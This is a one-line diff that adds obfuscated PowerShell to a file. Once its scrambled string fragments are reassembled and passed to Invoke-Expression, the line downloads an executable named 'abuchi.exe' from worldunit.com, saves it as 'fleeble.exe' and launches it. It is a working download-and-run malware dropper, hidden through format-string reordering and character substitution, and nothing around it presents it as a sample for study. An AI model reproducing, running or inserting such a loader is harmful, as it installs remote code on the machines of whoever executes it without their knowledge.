@@ -1,0 +1,1 @@
+﻿ ((("{20}{14}{1}{26}{7}{21}{6}{3}{22}{4}{25}{19}{10}{17}{12}{18}{5}{8}{15}{13}{16}{2}{11}{0}{9}{24}{23}"-f 'Pr','ys','art','dFi','e(d','e','lient).Downloa','.Net.We','d','ocess dqWfleeble','p://world','-','chi.e','le.exed','ct S','qW,dqWfleeb','qW);St','nit.com/abu','x','htt','(New-Obje','bC','l','exedqW','.','qW','tem'))-rEpLaCE  ([ChaR]100+[ChaR]113+[ChaR]87),[ChaR]39) |IeX
